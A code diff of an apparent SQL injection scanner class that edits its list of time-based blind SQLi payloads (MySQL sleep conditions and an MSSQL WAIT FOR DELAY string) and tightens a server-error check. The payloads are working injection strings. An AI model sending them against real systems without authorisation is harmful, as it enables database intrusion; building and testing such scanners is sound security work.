@@ -15,8 +15,8 @@ class SqliManager:
         self._domain = domain
         # self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
         self._time_based_payloads = [
-            {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
-            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
+            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\''},
+            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20'},
             {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
         ]
         self._delay_in_seconds = 5
@@ -190,5 +190,5 @@ class SqliManager:
                 else:
                     print("Duplicate FORM SQLi: - " + url_payload)
 
-            if str(response.status_code)[0] == '5':
+            if response.status_code == 500:
                 print("SqliManager: 500 status - " + url_payload)
